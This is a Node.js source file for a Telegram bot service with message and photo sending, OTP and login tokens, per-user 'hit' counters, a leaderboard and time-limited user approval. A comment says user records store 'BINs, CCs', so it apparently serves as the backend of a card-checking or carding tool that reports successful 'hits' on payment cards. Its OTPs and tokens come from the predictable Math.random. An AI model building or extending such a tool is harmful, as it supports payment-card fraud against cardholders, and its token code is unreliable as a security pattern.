// ===================================
// Telegram Bot Service
// Uses your bot to send OTP, hit notifications, and photos
// ===================================

const TELEGRAM_API = 'https://api.telegram.org/bot';

// Database instance (will be injected)
let db = null;

// Set database instance
function setDatabase(databaseInstance) {
  db = databaseInstance;
}

async function sendMessage(botToken, chatId, text, opts = {}) {
  console.log('sendMessage: Attempting to send message to', chatId);
  if (!botToken || !chatId) {
    console.error('sendMessage: Missing bot token or chat_id');
    return { ok: false, error: 'Missing bot token or chat_id' };
  }

  if (!text || typeof text !== 'string') {
    console.error('sendMessage: Invalid text parameter');
    return { ok: false, error: 'Invalid text parameter' };
  }

  try {
    const url = `${TELEGRAM_API}${botToken}/sendMessage`;
    const body = {
      chat_id: String(chatId).replace(/\D/g, '') || chatId,
      text,
      parse_mode: 'HTML',
      ...opts,
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout

    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!res.ok) {
      const errorText = await res.text().catch(() => 'Unknown error');
      console.error(`sendMessage: HTTP ${res.status}: ${errorText}`);
      return { ok: false, error: `HTTP ${res.status}: ${errorText}` };
    }

    const data = await res.json().catch(() => ({ ok: false, description: 'Invalid JSON response' }));

    if (!data.ok) {
      console.error('sendMessage: Telegram API error:', data.description);
    }

    return data; // Return the full Telegram API response
  } catch (e) {
    if (e.name === 'AbortError') {
      console.error('sendMessage: Request timeout');
      return { ok: false, error: 'Request timeout' };
    }
    console.error('sendMessage: Network error:', e.message);
    return { ok: false, error: `Network error: ${e.message}` };
  }
}

async function sendPhoto(botToken, chatId, photoBase64, caption) {
  if (!botToken || !chatId || !photoBase64) {
    console.error('sendPhoto: Missing bot token, chat_id or photo');
    return { ok: false, error: 'Missing bot token, chat_id or photo' };
  }

  try {
    const FormData = require('form-data');
    const base64Data = String(photoBase64).replace(/^data:image\/\w+;base64,/, '');

    // Validate base64 format
    if (!/^[A-Za-z0-9+/]*={0,2}$/.test(base64Data)) {
      console.error('sendPhoto: Invalid base64 format');
      return { ok: false, error: 'Invalid base64 image format' };
    }

    const buffer = Buffer.from(base64Data, 'base64');

    // Check if buffer is valid image (basic size check)
    if (buffer.length < 100) {
      console.error('sendPhoto: Image data too small');
      return { ok: false, error: 'Invalid image data' };
    }

    const form = new FormData();
    form.append('chat_id', String(chatId).replace(/\D/g, '') || chatId);
    form.append('photo', buffer, { filename: 'screenshot.png', contentType: 'image/png' });
    if (caption) {
      form.append('caption', caption);
      form.append('parse_mode', 'HTML');
    }

    const url = `${TELEGRAM_API}${botToken}/sendPhoto`;

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 second timeout for images

    const res = await fetch(url, {
      method: 'POST',
      body: form,
      headers: form.getHeaders(),
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!res.ok) {
      const errorText = await res.text().catch(() => 'Unknown error');
      console.error(`sendPhoto: HTTP ${res.status}: ${errorText}`);
      return { ok: false, error: `HTTP ${res.status}: ${errorText}` };
    }

    const data = await res.json().catch(() => ({ ok: false, description: 'Invalid JSON response' }));

    if (!data.ok) {
      console.error('sendPhoto: Telegram API error:', data.description);
    }

    return { ok: data.ok, error: data.description };
  } catch (e) {
    if (e.name === 'AbortError') {
      console.error('sendPhoto: Request timeout');
      return { ok: false, error: 'Request timeout' };
    }
    console.error('sendPhoto: Error:', e.message);
    return { ok: false, error: `Error: ${e.message}` };
  }
}

// In-memory OTP store (tg_id -> { token, expiresAt })
const otpStore = new Map();
const OTP_TTL_MS = 5 * 60 * 1000; // 5 minutes

// Login token store (token -> { tg_id, firstName, expiresAt })
const loginTokenStore = new Map();
const loginTokenByTgId = new Map(); // tg_id -> token (for cleanup)
const LOGIN_TOKEN_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours

function generateLoginToken(tgId, firstName) {
  // Use alphanumeric characters for better security (36^12 vs 26^12 combinations)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let token = '';
  for (let i = 0; i < 12; i++) token += chars[Math.floor(Math.random() * chars.length)];
  const expiresAt = Date.now() + LOGIN_TOKEN_TTL_MS;
  const id = String(tgId);
  const name = firstName || 'User';
  const old = loginTokenByTgId.get(id);
  if (old) loginTokenStore.delete(old);
  loginTokenStore.set(token, { tg_id: id, firstName: name, expiresAt });
  loginTokenByTgId.set(id, token);
  setUserName(id, name);
  return token;
}

function validateLoginToken(token) {
  const key = String(token || '').trim().toUpperCase();
  const entry = loginTokenStore.get(key);
  if (!entry) return null;
  if (Date.now() > entry.expiresAt) {
    loginTokenStore.delete(key);
    loginTokenByTgId.delete(entry.tg_id);
    return null;
  }
  return { tg_id: entry.tg_id, name: entry.firstName };
}

/** Get current valid login token for user, or null if none/expired */
function getLoginTokenForUser(tgId) {
  const id = String(tgId);
  const token = loginTokenByTgId.get(id);
  if (!token) return null;
  const entry = loginTokenStore.get(token);
  if (!entry || Date.now() > entry.expiresAt) {
    loginTokenStore.delete(token);
    loginTokenByTgId.delete(id);
    return null;
  }
  return token;
}

function generateOTP() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

function setOTP(tgId, token) {
  otpStore.set(String(tgId), { token, expiresAt: Date.now() + OTP_TTL_MS });
}

function verifyOTP(tgId, token) {
  const entry = otpStore.get(String(tgId));
  if (!entry) return false;
  if (Date.now() > entry.expiresAt) {
    otpStore.delete(String(tgId));
    return false;
  }
  const valid = entry.token === String(token).trim();
  if (valid) {
    otpStore.delete(String(tgId));
    setUserName(String(tgId), 'User');
  }
  return valid;
}

// User hits and names (stored in database)
function getUserHits(tgId) {
  if (!db) return 0;
  try {
    const result = db.prepare('SELECT hits FROM telegram_users WHERE tg_id = ?').get(String(tgId));
    return result ? result.hits : 0;
  } catch (error) {
    console.error('Error getting user hits:', error);
    return 0;
  }
}

function getGlobalHits() {
  if (!db) return 0;
  try {
    const result = db.prepare('SELECT SUM(hits) as total FROM telegram_users').get();
    return result ? result.total || 0 : 0;
  } catch (error) {
    console.error('Error getting global hits:', error);
    return 0;
  }
}

function incrementUserHits(tgId) {
  console.log('[DATABASE] incrementUserHits called for user:', tgId);
  if (!db) {
    console.error('[DATABASE] Database not available');
    return;
  }
  const id = String(tgId);
  try {
    // First ensure user exists
    console.log('[DATABASE] Ensuring user exists in database');
    db.prepare(`
      INSERT OR IGNORE INTO telegram_users (tg_id, name, hits)
      VALUES (?, ?, 0)
    `).run(id, getUserName(tgId));

    // Then increment hits
    console.log('[DATABASE] Incrementing hits for user:', id);
    const result = db.prepare(`
      UPDATE telegram_users
      SET hits = hits + 1, updated_at = CURRENT_TIMESTAMP
      WHERE tg_id = ?
    `).run(id);

    console.log('[DATABASE] Update result:', result);
  } catch (error) {
    console.error('[DATABASE] Error incrementing user hits:', error);
  }
}

function setUserName(tgId, firstName) {
  if (!db || !tgId || !firstName) return;
  const id = String(tgId);
  const name = String(firstName);
  try {
    db.prepare(`
      INSERT INTO telegram_users (tg_id, name, hits)
      VALUES (?, ?, COALESCE((SELECT hits FROM telegram_users WHERE tg_id = ?), 0))
      ON CONFLICT(tg_id) DO UPDATE SET
        name = excluded.name,
        updated_at = CURRENT_TIMESTAMP
    `).run(id, name, id);
  } catch (error) {
    console.error('Error setting user name:', error);
  }
}

function getUserName(tgId) {
  if (!db) return 'User';
  try {
    const result = db.prepare('SELECT name FROM telegram_users WHERE tg_id = ?').get(String(tgId));
    return result ? result.name : 'User';
  } catch (error) {
    console.error('Error getting user name:', error);
    return 'User';
  }
}

function getTopUsers(limit = 10) {
  if (!db) return [];
  try {
    const results = db.prepare(`
      SELECT tg_id, name, hits
      FROM telegram_users
      WHERE hits > 0
      ORDER BY hits DESC
      LIMIT ?
    `).all(limit);

    return results.map(row => ({
      tg_id: row.tg_id,
      name: row.name || 'User',
      hits: row.hits,
    }));
  } catch (error) {
    console.error('Error getting top users:', error);
    return [];
  }
}

function getTopRealUsers(limit = 10) {
  if (!db) return [];
  try {
    const results = db.prepare(`
      SELECT tg_id, name, hits
      FROM telegram_users
      WHERE hits > 0 AND tg_id != 'SYSTEM_BONUS_HITS'
      ORDER BY hits DESC
      LIMIT ?
    `).all(limit);

    return results.map(row => ({
      tg_id: row.tg_id,
      name: row.name || 'User',
      hits: row.hits,
    }));
  } catch (error) {
    console.error('Error getting top real users:', error);
    return [];
  }
}

function getUserRank(tgId) {
  if (!db) return null;
  try {
    const result = db.prepare(`
      SELECT COUNT(*) + 1 as rank
      FROM telegram_users
      WHERE hits > (SELECT hits FROM telegram_users WHERE tg_id = ?)
    `).get(String(tgId));

    return result ? result.rank : null;
  } catch (error) {
    console.error('Error getting user rank:', error);
    return null;
  }
}

// User approval system
function approveUser(tgId, durationHours) {
  if (!db || !tgId) return false;
  const id = String(tgId);
  const expiresAt = Date.now() + (durationHours * 60 * 60 * 1000); // Convert hours to milliseconds

  try {
    // Get existing user data or create empty object
    const existingData = getUserData(id) || {};
    existingData.approved = true;
    existingData.approvedAt = Date.now();
    existingData.expiresAt = expiresAt;

    setUserData(id, existingData);
    return true;
  } catch (error) {
    console.error('Error approving user:', error);
    return false;
  }
}

function isUserApproved(tgId) {
  if (!db || !tgId) return false;

  try {
    const userData = getUserData(tgId);
    if (!userData || !userData.approved || !userData.expiresAt) {
      return false;
    }

    // Check if approval has expired
    return Date.now() < userData.expiresAt;
  } catch (error) {
    console.error('Error checking user approval:', error);
    return false;
  }
}

function getUserApprovalInfo(tgId) {
  if (!db || !tgId) return null;

  try {
    const userData = getUserData(tgId);
    if (!userData || !userData.approved) {
      return null;
    }

    const now = Date.now();
    const isActive = now < (userData.expiresAt || 0);
    const timeLeft = Math.max(0, (userData.expiresAt || 0) - now);
    const hoursLeft = Math.ceil(timeLeft / (60 * 60 * 1000));

    return {
      approved: isActive,
      approvedAt: userData.approvedAt,
      expiresAt: userData.expiresAt,
      hoursLeft: hoursLeft,
      timeLeft: timeLeft
    };
  } catch (error) {
    console.error('Error getting user approval info:', error);
    return null;
  }
}

// User data store (stored in database) - BINs, CCs, prefs, approvals
function setUserData(tgId, data) {
  if (!db || !tgId || typeof data !== 'object') return;
  const id = String(tgId);
  try {
    const jsonData = JSON.stringify(data);
    db.prepare(`
      INSERT INTO telegram_user_data (tg_id, data_json, updated_at)
      VALUES (?, ?, CURRENT_TIMESTAMP)
      ON CONFLICT(tg_id) DO UPDATE SET
        data_json = excluded.data_json,
        updated_at = CURRENT_TIMESTAMP
    `).run(id, jsonData);
  } catch (error) {
    console.error('Error setting user data:', error);
  }
}

function getUserData(tgId) {
  if (!db) return null;
  try {
    const result = db.prepare('SELECT data_json FROM telegram_user_data WHERE tg_id = ?').get(String(tgId));
    return result ? JSON.parse(result.data_json) : null;
  } catch (error) {
    console.error('Error getting user data:', error);
    return null;
  }
}

async function answerCallbackQuery(botToken, callbackQueryId, text) {
  if (!botToken || !callbackQueryId) return { ok: false };
  try {
    const url = `${TELEGRAM_API}${botToken}/answerCallbackQuery`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
    });
    const data = await res.json();
    return { ok: data.ok };
  } catch (e) {
    return { ok: false };
  }
}

async function editMessageText(botToken, chatId, messageId, text, opts = {}) {
  if (!botToken || !chatId || !messageId) return { ok: false, error: 'Missing params' };
  try {
    const url = `${TELEGRAM_API}${botToken}/editMessageText`;
    const body = {
      chat_id: String(chatId).replace(/\D/g, '') || chatId,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      ...opts,
    };
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const data = await res.json();
    return { ok: data.ok, error: data.description };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

const MAIN_MENU_KEYBOARD = {
  inline_keyboard: [
    [{ text: '🔑 Generate Token', callback_data: 'get_login_token' }],
    [{ text: '📈 My Stats', callback_data: 'my_stats' }, { text: '🎯 My Hits', callback_data: 'my_hits' }],
    [{ text: '🏆 Scoreboard', callback_data: 'scoreboard' }],
    [{ text: '👤 Profile', callback_data: 'profile' }, { text: '❓ Help', callback_data: 'help' }],
  ],
};

module.exports = {
  setDatabase,
  sendMessage,
  sendPhoto,
  editMessageText,
  MAIN_MENU_KEYBOARD,
  generateOTP,
  setOTP,
  verifyOTP,
  generateLoginToken,
  validateLoginToken,
  getLoginTokenForUser,
  answerCallbackQuery,
  incrementUserHits,
  getUserHits,
  getGlobalHits,
  setUserName,
  getUserName,
  getTopUsers,
  getTopRealUsers,
  getUserRank,
  setUserData,
  getUserData,
  approveUser,
  isUserApproved,
  getUserApprovalInfo,
};
